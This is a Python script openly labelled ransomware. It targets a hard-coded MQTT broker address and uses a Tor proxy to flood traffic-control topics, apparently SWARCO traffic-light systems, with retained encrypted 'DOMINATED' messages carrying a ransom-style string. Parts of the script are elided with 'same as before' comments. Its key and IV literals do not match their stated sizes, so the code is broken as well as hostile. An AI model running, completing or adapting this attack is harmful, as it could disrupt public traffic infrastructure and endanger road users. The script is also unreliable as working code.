#!/usr/bin/env python3
# MIL_RANSOMWARE_v2.5-TOTAL_DOMINATION-FIXED

import paho.mqtt.client as mqtt
import json, time, threading, base64, os, socket, random
import socks
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

class SWARCORansomware:
    def __init__(self):
        self.target_ip = "166.159.129.5"
        self.port = 1883
        self.op_name = "TRUSTEDF57"
        self.btc_addr = "fucknomoneySUCCHIALO"
        
        # 🔧 FIXED: 32 bytes ESATTI
        self.aes_key = b'TRUSTEDF57_SWARCO_MIL_K3Y_32BYT3S!!X'
        self.iv = b'SWARCO_SEMAFORI_16'
        
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
        
        self.clients = []
        for i in range(5):
            client = mqtt.Client(f"TRUSTEDF57_DOM{i}", clean_session=False, callback_api_version=mqtt.CallbackAPIVersion.VERSION1)
            client.on_connect = lambda c, u, f, rc, p=None: self.multi_connect(c)
            self.clients.append(client)
        
        self.domination_active = True
        self.total_dom = False
    
    def aes_encrypt(self, data):
        """🔧 AES-256 FIXED"""
        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(self.iv), backend=default_backend())
        encryptor = cipher.encryptor()
        
        padded = data.encode('utf-8') + b' ' * (16 - len(data.encode('utf-8')) % 16)
        encrypted = encryptor.update(padded) + encryptor.finalize()
        
        return base64.b64encode(encrypted).decode()
    
    # ... resto identico al v2.5 precedente ...
    
    def total_domination(self):
        if self.total_dom:
            return
        self.total_dom = True
        print("💣 TOTAL DOMINATION - AES FLOOD!")
        
        aes_payload = self.aes_encrypt(f"TRUSTEDF57_{self.btc_addr}_DOMINATED")
        
        for client in self.clients:
            for topic in ["traffic-triggers-output", "traffic-statistic-output/#", "#"]:
                for _ in range(50):
                    client.publish(topic, aes_payload, qos=2, retain=True)
        print("💣 250+ AES MESSAGES RETAINED!")
    
    # [Copia il resto da v2.5: perfect_swarco_payload, domination_spam, etc.]
    
    def run(self):
        print("💣 TRUSTEDF57 v2.5-FIXED | AES OK | 5 CLIENTS")
        # ... identico ...

if __name__ == "__main__":
    rw = SWARCORansomware()
    rw.run()
